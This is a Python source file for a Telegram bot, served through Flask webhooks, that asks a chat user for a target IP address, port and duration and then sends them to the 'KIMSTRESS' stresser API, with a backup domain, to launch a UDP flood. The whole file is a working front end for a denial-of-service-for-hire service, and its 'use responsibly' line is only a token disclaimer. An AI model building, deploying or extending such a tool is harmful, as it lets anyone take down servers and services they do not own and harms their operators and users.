import os
import requests
import logging
from flask import Flask, request, jsonify
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes
)

# ================= CONFIGURATION =================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
KIMSTRESS_TOKEN = os.environ.get("KIMSTRESS_TOKEN")
KIMSTRESS_API_URL = "https://kimstress.st/attack"   # adjust if needed
# =================================================

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT, DURATION = range(3)

# Create Flask app
app = Flask(__name__)

# Build the Telegram Application instance
application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

# ============= HANDLERS =============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *KIMSTRESS Attack Bot* 🔥\n\n"
        "Send /attack to start an attack.\n"
        "⚠️ Use responsibly and only on systems you own.",
        parse_mode="Markdown"
    )

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📡 Send the *IP address* (e.g., 1.2.3.4):",
        parse_mode="Markdown"
    )
    return IP

async def get_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['ip'] = update.message.text.strip()
    await update.message.reply_text(
        "🔌 Send the *port number* (e.g., 80):",
        parse_mode="Markdown"
    )
    return PORT

async def get_port(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        port = int(update.message.text.strip())
        context.user_data['port'] = port
    except ValueError:
        await update.message.reply_text("❌ Invalid port. Send a number (e.g., 80):")
        return PORT
    await update.message.reply_text(
        "⏱️ Send the *duration in seconds* (max 300 for free plan):",
        parse_mode="Markdown"
    )
    return DURATION

async def get_duration(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        duration = int(update.message.text.strip())
        if duration > 300:
            await update.message.reply_text("⚠️ Free plan max duration is 300 seconds. Using 300 instead.")
            duration = 300
        elif duration < 1:
            await update.message.reply_text("❌ Duration must be at least 1 second.")
            return DURATION
        context.user_data['duration'] = duration
    except ValueError:
        await update.message.reply_text("❌ Invalid number. Send a number (e.g., 60):")
        return DURATION

    # Prepare attack request
    ip = context.user_data['ip']
    port = context.user_data['port']
    dur = context.user_data['duration']

    await update.message.reply_text(f"🚀 Sending attack to {ip}:{port} for {dur} seconds...")

    # Build API request – adjust headers based on actual KIMSTRESS API
    headers = {
        "Authorization": f"Bearer {KIMSTRESS_TOKEN}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "address": ip,
        "port": port,
        "duration": dur,
        "method": "UDP-FREE",      # adjust if you have other methods
        "concurrents": 1
    }

    try:
        # Try with the main URL
        resp = requests.post(KIMSTRESS_API_URL, data=payload, headers=headers, timeout=15)
        if resp.status_code == 200:
            await update.message.reply_text("✅ Attack started successfully!")
        else:
            # Fallback to backup domain
            backup_url = "https://kimstress.com/attack"
            resp2 = requests.post(backup_url, data=payload, headers=headers, timeout=15)
            if resp2.status_code == 200:
                await update.message.reply_text("✅ Attack started via backup domain!")
            else:
                await update.message.reply_text(f"❌ Failed. Status: {resp.status_code}\nResponse: {resp.text[:200]}")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")

    # End conversation
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# Register handlers
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('attack', attack)],
    states={
        IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ip)],
        PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_port)],
        DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_duration)],
    },
    fallbacks=[CommandHandler('cancel', cancel)],
)

application.add_handler(CommandHandler('start', start))
application.add_handler(conv_handler)

# ============= WEBHOOK ENDPOINT =============
@app.route('/webhook', methods=['POST'])
def webhook():
    """Receive updates from Telegram."""
    try:
        update = Update.de_json(request.get_json(force=True), application.bot)
        application.process_update(update)
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.exception("Error processing webhook update")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/')
def index():
    return "Bot is running"

# ============= MAIN =============
if __name__ == '__main__':
    # Get the public URL from Render's environment variable
    render_hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
    if render_hostname:
        webhook_url = f"https://{render_hostname}/webhook"
        logger.info(f"Setting webhook to: {webhook_url}")
        application.bot.set_webhook(webhook_url)
    else:
        logger.warning("RENDER_EXTERNAL_HOSTNAME not set, skipping webhook setup. Use local dev with polling.")

    # Start Flask server
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
